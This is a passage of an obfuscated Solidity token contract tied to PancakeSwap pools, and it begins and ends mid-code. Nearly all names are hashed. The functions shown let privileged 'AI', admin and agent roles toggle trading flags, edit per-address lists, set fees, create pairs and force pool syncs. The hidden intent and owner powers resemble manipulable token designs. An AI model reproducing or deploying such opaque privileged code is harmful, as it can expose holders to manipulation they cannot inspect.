Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb;if(Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb) Oxa7bbff86979e0b6a116f18fb90a83136e3b5baad0856f1d7aa9651e44b5fd6aff5877607328573a6e7bb8271f5e7867993a038bf079b74e7fa725ae391f50df0 = block.timestamp;}function Oxb4061969915df9cb920beceef398a29d7451f441f78c95b5fffa350151c80f88366e99ba64c43271715b0b4b10355dc1f5b3d204764ed3d26b3ee23fd8cb7085() external onlyAI {Ox4546b19be301da5b190ad3d48eb66286926dcf8759e5b67f5d15e4d4e661c90d0bbec58ccd6f2d24b844b3c0503b43edd9d5cbdccf04a6c038cb62d84d6cbb8a = true;Oxa7bbff86979e0b6a116f18fb90a83136e3b5baad0856f1d7aa9651e44b5fd6aff5877607328573a6e7bb8271f5e7867993a038bf079b74e7fa725ae391f50df0 = block.timestamp;Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxcfa597d19eeeedbc038e6ec805f5ee1d1ced2bb18f6126601d704322e77ba2879635756fad9058d356861c1e08c1ba6d3bc739223681e00cfac2364aea3ad5a5 = true;Ox5be8ad281e015a2540bac067bffc0fac9bd290783aec2cbc9006196a47d82339f291b0d7134813441a3bf2e69f9385e64eb15801b94fc9acac863d65d082fee0 = block.timestamp;Ox29194b0725c83e6c356facae79255d0a5d86ce160f89c7ceada0af0559f33a1a14518bd73b40c1694a9a3fcb301af4c864335624595b15644369a1316041b36d = true;Ox612e05714958387f480fa7ce4114b501f1970e5038b72ec422a5bd6d1f1e3bcb27b91a2bfdb615a789c5ccf0d5821161292c8d02f2ca8e0ee2f52b302a00a2d5 = block.timestamp;}function Oxc015e3130746f5d224a6e371c731c99d03c4c74f39f0bf1db5f372f29783e0234297f8fcf457898d104c0c32f620c069504a1d16324f73612160eaf8a77c579c(uint256 _Ox733860415c880515084223ed9eb6687a832161188cd3dc81a6fa7806c94c6c6dd907e48434efcbf7edc25de991208631a0a9a759c869e98d899690cec5ffe4fb, uint _Ox3cffbd991db34db73c8ce31c54545e2780649fa1065b514cdabe089c9afd283539aace8df22bf07f820d5a1234e86ff9f2809a789ea37b52b260bab3f9628b9e, uint256 _Ox42be1ae936b0eb13ecb943f338b14a4d2cb59de0ff7d6d85e2976233b24db3063440cba7b4508e8a43cbad5ab015615dc683fa9d8f159c8bf67a5e214ac70655, uint8 _Oxcb596cd72fb9955a60ca9e4b0bd52dc2a8a5469c6e33124ed502af5ce0c637180d3802f34c7be3d6155854b2e4d46557dac228a7629e53dfd38e87bcab619ef7, uint256 _Ox39b80d6ac8f3a94f307a60af1060182483dfe1f2e7773668434caf84fcbfb1f9ab4ef696c8a012f6b3bd463b07179020650136aefc2592ff299fecde0ba2b294) external onlyAI {Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox733860415c880515084223ed9eb6687a832161188cd3dc81a6fa7806c94c6c6dd907e48434efcbf7edc25de991208631a0a9a759c869e98d899690cec5ffe4fb = _Ox733860415c880515084223ed9eb6687a832161188cd3dc81a6fa7806c94c6c6dd907e48434efcbf7edc25de991208631a0a9a759c869e98d899690cec5ffe4fb;Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox3cffbd991db34db73c8ce31c54545e2780649fa1065b514cdabe089c9afd283539aace8df22bf07f820d5a1234e86ff9f2809a789ea37b52b260bab3f9628b9e = _Ox3cffbd991db34db73c8ce31c54545e2780649fa1065b514cdabe089c9afd283539aace8df22bf07f820d5a1234e86ff9f2809a789ea37b52b260bab3f9628b9e;Ox42be1ae936b0eb13ecb943f338b14a4d2cb59de0ff7d6d85e2976233b24db3063440cba7b4508e8a43cbad5ab015615dc683fa9d8f159c8bf67a5e214ac70655 = _Ox42be1ae936b0eb13ecb943f338b14a4d2cb59de0ff7d6d85e2976233b24db3063440cba7b4508e8a43cbad5ab015615dc683fa9d8f159c8bf67a5e214ac70655;Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxcb596cd72fb9955a60ca9e4b0bd52dc2a8a5469c6e33124ed502af5ce0c637180d3802f34c7be3d6155854b2e4d46557dac228a7629e53dfd38e87bcab619ef7 = _Oxcb596cd72fb9955a60ca9e4b0bd52dc2a8a5469c6e33124ed502af5ce0c637180d3802f34c7be3d6155854b2e4d46557dac228a7629e53dfd38e87bcab619ef7;Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox39b80d6ac8f3a94f307a60af1060182483dfe1f2e7773668434caf84fcbfb1f9ab4ef696c8a012f6b3bd463b07179020650136aefc2592ff299fecde0ba2b294 = _Ox39b80d6ac8f3a94f307a60af1060182483dfe1f2e7773668434caf84fcbfb1f9ab4ef696c8a012f6b3bd463b07179020650136aefc2592ff299fecde0ba2b294;}function Ox2d851bc155abb4edc970a4e2dbec3cf596bb7649bda306f6dd4e53064b2e503da5691412b1bfe973007fe206dbada6ab0eff5aa36642ee049f83287c5092f5f3(bool Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb, bool Ox6a7ded0a146cbefa88fe233881eb4d14b13aeeba698aab8c597c279ecc2ba4b146fc4460f5758555fdc8a6af0eee857d1e6e93691a06efce90abf567213f7db6, bool Oxe389aa91767c9ac6296bd440fb864a194b362cd894a70af4e7a8e965b50c90ccd02fba0796f1c91af160a58eeabfdbeb4d28011e595066d7f75ff7fe35faf3d5) external onlyAI {if(Oxe389aa91767c9ac6296bd440fb864a194b362cd894a70af4e7a8e965b50c90ccd02fba0796f1c91af160a58eeabfdbeb4d28011e595066d7f75ff7fe35faf3d5) Ox5be8ad281e015a2540bac067bffc0fac9bd290783aec2cbc9006196a47d82339f291b0d7134813441a3bf2e69f9385e64eb15801b94fc9acac863d65d082fee0 = block.timestamp;if (Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb) {Ox29194b0725c83e6c356facae79255d0a5d86ce160f89c7ceada0af0559f33a1a14518bd73b40c1694a9a3fcb301af4c864335624595b15644369a1316041b36d = Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb;Ox612e05714958387f480fa7ce4114b501f1970e5038b72ec422a5bd6d1f1e3bcb27b91a2bfdb615a789c5ccf0d5821161292c8d02f2ca8e0ee2f52b302a00a2d5 = block.timestamp;} else {Ox29194b0725c83e6c356facae79255d0a5d86ce160f89c7ceada0af0559f33a1a14518bd73b40c1694a9a3fcb301af4c864335624595b15644369a1316041b36d = Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb;}Ox0c8d6de5ea1e5aa05d7c247bded0351923f1ea87f987037d60a8be779d10220db90ad2e41ffd8d7896eb45a66699379b52bbe6406cd0f3feb72822fac2173eaa = Ox6a7ded0a146cbefa88fe233881eb4d14b13aeeba698aab8c597c279ecc2ba4b146fc4460f5758555fdc8a6af0eee857d1e6e93691a06efce90abf567213f7db6;}function manualSync(address Ox1fb5954eaa679764410b6656f99974fac6423597f351227e51f66f1693427423ae279dc306b10d06668e928924af547b732ba032951acff5d4a7088eb593e4bd) external onlyAI {IPancakeSwapPair(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox1fb5954eaa679764410b6656f99974fac6423597f351227e51f66f1693427423ae279dc306b10d06668e928924af547b732ba032951acff5d4a7088eb593e4bd].pairAddress).sync();}function Ox3e002dabaf3511ba2ec25d19f245adc41a1e04429fea286b8530616eb5de3caba9a817b4ed47a0292e175cec0009cae89a3bbcf6943f848359bfbab31b29b664(bool value) external onlyAI {Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxd742d77c12f812e8ec674d45cc850fea400c72ddf403788d2c6bcbed12494d2e4b9c26fe97cf82106e441de1f75543ed0bc6fba9d4fb6e5a701227c8559b1bf1 = value;}function Ox7ebbe614d368f67290d789eb2fccd337772c955fc51883a0d098bc5d98fbac07d467cf1475c92dfd24bf91bda4fff5be01eabd330d23f0054ddef1d43ac8a8d4(uint256 value) external onlyAI {Ox95ab1a645be7533aa710ad76bcd8f637dec596054fda6ebb653340171d5aa2f18ef787383bbce2f5d4de344c0897c02671c48cea638381b074e76dc1bc940b71 = value;}function Oxaeeea9bb6b3628bb43dde14c64391dfd98ba0000fcca61f5cd50a4823e94feb111702d973e0799220c68238fce4b702b4dc706dbcf515ae7809df7b858408697(uint256 index, uint256 value ) external onlyAI {Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357[index] = value;}function Ox94cd3192a38c4d7630d2918df949b6b80a3e665f77cfa8ef4e37fa55a2f698970a1984309c4e823e3858b0d3dd3f91140f1da917f0fb5621f05c51f994ccbcda(bool Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb) external onlyAI { Oxb39c69daa3f1158ba3153919f7ad2ef855672a9d98e61d7be50b3b382e17eb5dacc98257b885a35b82ae73283116c1010adde4e74fa73dcd678c4f556ae35a3d = Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb;}function Oxeabed66e2b101b05fc4fcccde9cfd7fae6fa57234b6544061225f3a8e0d3382828a981bafa0bf002ad210fbbd4d6fe45da91a6c8921cdddeb702859a298a65cc(uint256 value) external onlyAI { Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox3d1cd33121ce047fe4e2a855f65c89f97bc448c1d889187369ed49bd21372fa9e97d20c665ba71f2d41d6d26868cb26d20553088349de129520da8d1020dc289 = value;}function Ox670367addaa37592a286d3ed090828cf6c49a1a36a548e77c4cb368fc86e93311004c69f41dc1e2a757536d45181765802cf728da0f5deb3d5516d779c97cbdf(uint256 value) external onlyAI { Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox9d36153e52001dc3612238ff2616f960ecd284475e6909d8df851ea75c0ea398495e9bf6a484425bc4bbc006b9056a310e9c81be0ac9142903746b41ab5eb515 = value;}function Oxb6901aecf2fd84bbde06e2386f89d6bf111d1e58758c01b59126cc9c872e17cc19c6b9b73d04c3eb59ce4717bd1a5a7b37e83fa05c7a4db9d66ddd504e6c92bd(uint256 value) external onlyAI { Ox6c221ae35b524ffb96d1358d9ff7d5257d03fe0e9e805f777b51259abf6cd1ee1a13338fe694b5281451412bba399a231599bffa83fa282983084b32af5d282c = value;}function Ox18cd2ad7891e5d582f2564fe4905a61eacc06bd0fb2f0903dc8bae7f5984e812d4efbf50fd4eff6c0f45dfd06a28ab06afcb3910e1893d19462b7f72ae995642(address value) external onlyAI{Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc = value;}function Oxd222d08f87238edacc8c5bc9c46596d217bf31c3e4d89d0aa107c70269aebb9bad455d796c3adec4a854e8e920fa3d446d778e2dff5e5794b209c211cd83ec60(uint256 _Oxfe014cf0bb6538c63e80acf759b89d0827d801a7f25530632f3591edf863e03b9f089c37fd36952151ba4b797c9263bd06cb379f5e2f89065882b7d7190cccff, uint256 _Oxfd3352e517111b483889d7a73f91ddc63bf9801be4b97b8fae8c5a5948e15492dae9f6f7798a9f7f265f791d7413f58b165d77cbf72c931b7febb6b9266affd1) external onlyAI{Oxfe014cf0bb6538c63e80acf759b89d0827d801a7f25530632f3591edf863e03b9f089c37fd36952151ba4b797c9263bd06cb379f5e2f89065882b7d7190cccff = _Oxfe014cf0bb6538c63e80acf759b89d0827d801a7f25530632f3591edf863e03b9f089c37fd36952151ba4b797c9263bd06cb379f5e2f89065882b7d7190cccff;Oxfd3352e517111b483889d7a73f91ddc63bf9801be4b97b8fae8c5a5948e15492dae9f6f7798a9f7f265f791d7413f58b165d77cbf72c931b7febb6b9266affd1 = _Oxfd3352e517111b483889d7a73f91ddc63bf9801be4b97b8fae8c5a5948e15492dae9f6f7798a9f7f265f791d7413f58b165d77cbf72c931b7febb6b9266affd1;}function Ox19b9082fdaaa36dec5ecfe03a451ce62345c20ba5774142dd11c17da4b601b5ebfae9cecccd3ce2f098438e7d427148e146a6c21c5634276345d2c41afd69df6(uint256 _Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1c0a97fe397dfb6c6d2e835, uint256 _Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88) external onlyAI { Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1c0a97fe397dfb6c6d2e835 = _Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1c0a97fe397dfb6c6d2e835; Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88 = _Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88;}function Oxba73512a0edf5c3f86639b766de40272bc918a0d5ec42d0f310a8b6ec7ccd781a39a05dcb08f6ed8df8abdc217d7cc88445bf711e4e790a957123d33e6ac0da9(uint256 index) external onlyAdmin{uint256 Ox485f0e9980ba00d234c96cc9c6e6322f4ad7058760e0e461dd76805ce2c68768ae549e369fff40219de159aa9646f600611bb08663788613885fcc1b79b4ad3f;for(uint256 i; i<Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b-1; i++) {if(i == index) Ox485f0e9980ba00d234c96cc9c6e6322f4ad7058760e0e461dd76805ce2c68768ae549e369fff40219de159aa9646f600611bb08663788613885fcc1b79b4ad3f++;poolList[i] = poolList[Ox485f0e9980ba00d234c96cc9c6e6322f4ad7058760e0e461dd76805ce2c68768ae549e369fff40219de159aa9646f600611bb08663788613885fcc1b79b4ad3f];Ox485f0e9980ba00d234c96cc9c6e6322f4ad7058760e0e461dd76805ce2c68768ae549e369fff40219de159aa9646f600611bb08663788613885fcc1b79b4ad3f++;}Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b--;}function Ox3e6094fc3f20982b930d205ea99379b6ec9fb5f3527273e27a53a3d5faf3185b817694f045cdb91746c622650ebb799a7980c914353c4d4124cb74bfb822030f(uint256 _Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9, uint256 _sifFee, uint256 _Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b) external onlyAdmin {require(_Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9 + _sifFee + _Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b < 30, "a");Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9 = _Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9;Oxb2c6616edd01f082ec7e4257d0c1fc301ce1135b3887cef21bbfae05497a58d846dffe712bf62adc0d5dec9cb16d94c6ec9efeb1bb84305349a0e9511b039245 = _sifFee;Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b = _Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b;Ox506767f56feeccc025988ca739ee8e43d125967cc0a101b8c05915f9a8898284d1e05d018b1131f58f4f2f12ca25d11ef97bec3aeccc0ce0f816859f7764698d = Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9 + Oxb2c6616edd01f082ec7e4257d0c1fc301ce1135b3887cef21bbfae05497a58d846dffe712bf62adc0d5dec9cb16d94c6ec9efeb1bb84305349a0e9511b039245 +  Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b;}function Oxc9e8425f3af054013440baf2164aa258e1e2cb450969a06cbb4201e03f496ba4cecd57b21877c2f2c1142ed281e08def641422d4777db51712deeabcf168fc17(address _Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556) external onlyAdmin {Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556 = _Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556;}function Ox6a76a799987c5cee978284495db53b5f05d4201b811bb0220d5686ea09edb8a47db3133a25aa023e61084f579598250e321f695326ba88eb8569343ae8d6beeb(address _Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595, bool Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb) external onlyAdmin {Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxcfa597d19eeeedbc038e6ec805f5ee1d1ced2bb18f6126601d704322e77ba2879635756fad9058d356861c1e08c1ba6d3bc739223681e00cfac2364aea3ad5a5 = Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb;Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox32e1c660a02473df7f52cb1262d12589e2c7fe1d445861f18bfdd3a289e8d63362b193b350f1576a7422f3333be527867cce31d03ef779875eab10644861a770 = _Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595;}function Ox8423d04660a10a02e9d7a8afc6fa7e1f52672a35ca7ba11e8a5a8aee53f06b7d29206a9ff906f1ec259c0cd2cd76172da452cf158119dd64daba3e7c01b0bde3(address Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b, bool Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb) external onlyAdmin {Ox309fa20f8837684aa40a99f1f1ddce45692a17baaafb03d060b5814508f616be474e99cee425b1437d592bea7e575ddd6dd2019e78cfa13ee3e3ea3c0332f68a[Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b] = Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb;}function Ox46b99b2408bf1c9b0e112247948bfd7b081cd894195ea12e3b3e952de290f4653b9d16bc95d7a4b24bb7935e0eb00936234be8486dff797830b7a45c0249bdb6(address _Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595, bool Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb) external onlyAdmin {require(Ox9668937a0d5754e2d07438f8f636702ca6810430a454d93f1c209764938afeb083df43e21a4d0a2cda1a8bb42c5f05acf688801af333d12d8b4c3b9c3d1c37fd(_Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595), "b");Ox3f5f94bc562cee134170bbd97c0b4849c3670bce368d3c02ebe0ac9aa7a7b1861c2e05ef1acd6856785c183c41c23a0d3ed28ca8f28cc443f8fa863fe02c70e5[_Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595] = Ox2f0df76285492e10fd0dc81ae6a456072ab93c56936d7d7ed1840885344d427894f58667f41008d3fceb23655c9184ac1b53eae24145eb0a07ae0e37a8f446fb;}function Ox1691b7056558bee11c35192f13cba358a43679657face5ed8b7151dacc904e67f6b7f3557c0a29a9263a1629113c886d8d78632004512da4d7d5a9519973d300(address Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595,bool Ox45e46a33a77d7593869adc947b3848cff6636984d1f321700baa8a8156edb092c2e92521723bb8e3c4512ee7aed378abfdd0ca50c8d6479c8880253a5cd38865,bool Ox7e5a55cea6fe70d177878a8fcefd7ea706c7a79fc073bb0f557ee46326b34355ce36d6590896979571c878b5f3b83a14ce327b4c2e2c5ca8b68853ced5ce60ab,pool memory _pool) external onlyAgent {if(Ox7e5a55cea6fe70d177878a8fcefd7ea706c7a79fc073bb0f557ee46326b34355ce36d6590896979571c878b5f3b83a14ce327b4c2e2c5ca8b68853ced5ce60ab || Ox45e46a33a77d7593869adc947b3848cff6636984d1f321700baa8a8156edb092c2e92521723bb8e3c4512ee7aed378abfdd0ca50c8d6479c8880253a5cd38865) require(Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595 != Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728, "c");if(_pool.Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728) _pool.Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 = address(this);if(_pool.Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728) _pool.Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 = address(this);if(!Ox45e46a33a77d7593869adc947b3848cff6636984d1f321700baa8a8156edb092c2e92521723bb8e3c4512ee7aed378abfdd0ca50c8d6479c8880253a5cd38865 && !Ox7e5a55cea6fe70d177878a8fcefd7ea706c7a79fc073bb0f557ee46326b34355ce36d6590896979571c878b5f3b83a14ce327b4c2e2c5ca8b68853ced5ce60ab) {Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595 = IPancakeSwapFactory(Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.factory()).createPair(_pool.Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150,_pool.Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3);}if(Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595 == poolList[0]) {pairAddress = Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595;Oxf1c9f443e2204d36184a898405024370822695a0c30eb9e7e9e9ca9ed056049781cec83f110db2708e2719707bb0b8f746b9d2548f8f9a3f39bc912676a017e0 = IPancakeSwapPair(Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595);}pool storage Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b = Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595];Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.pairAddress = Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxf1c9f443e2204d36184a898405024370822695a0c30eb9e7e9e9ca9ed056049781cec83f110db2708e2719707bb0b8f746b9d2548f8f9a3f39bc912676a017e0 = IPancakeSwapPair(Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.pairAddress);Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b = 